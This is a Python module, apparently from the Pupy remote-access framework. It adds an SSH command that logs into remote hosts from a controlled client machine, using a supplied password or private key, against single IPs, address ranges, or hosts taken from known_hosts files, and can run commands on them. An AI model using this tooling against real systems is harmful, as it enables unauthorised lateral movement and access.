# -*- coding: utf-8 -*-
from pupylib.PupyModule import *
from pupylib.utils.rpyc_utils import redirected_stdio

__class_name__="SSH"

@config(cat="admin", compatibilities=['windows', 'posix', 'darwin'])
class SSH(PupyModule):
    """ ssh client """

    dependencies = [
        'paramiko', 'cryptography', 'ecdsa', 'ssh'
    ]

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog="ssh", description=cls.__doc__)
        cls.arg_parser.add_argument('-u', '--user', default='', help='username')
        cls.arg_parser.add_argument('-p', '--password', default='', help='use plaintext password or ssh private key file')
        cls.arg_parser.add_argument('-k', '--private-key', default='', help='use plaintext password or ssh private key file')
        cls.arg_parser.add_argument('-c', '--command', default='', help='optional - command to execute on the remote host')
        cls.arg_parser.add_argument('-i', '--ip', default='', help='target address (could be a range)')
        cls.arg_parser.add_argument('--port', default=22, type=int, help='change the default ssh port')
        cls.arg_parser.add_argument('-f', '--file', default='', help='extract ip addresses from file (input could be know_hosts file)')
        cls.arg_parser.add_argument('-v', '--verbose', action='store_true', default=False, help='activate verbose output')

    def run(self, args):

        error = ''
        if not args.user:
            error = 'username is needed'

        elif args.password and args.private_key:
            error = 'specify either a plaintext password or a private key, not both'

        elif not args.password and not args.private_key:
            error = 'private_key or plain text password are needed'

        elif args.ip and args.file:
            error ='choose either an ip address or an input file, not both'

        elif not args.ip and not args.file:
            error ='not targets specify'

        if error:
            self.error(error)
            return

        error_code = False
        result = ''

        SSH = self.client.remote('ssh', 'SSH', False)

        ssh = SSH(
            args.user, args.private_key, args.password,
            args.file, args.ip, args.port, args.verbose,
            args.command
        )

        if args.verbose:
            with redirected_stdio(self):
                error_code, result = ssh.ssh_client()
        else:
            error_code, result = ssh.ssh_client()

        if not error_code:
            self.error('%s' % result)
        else:
            self.success('%s' % result)
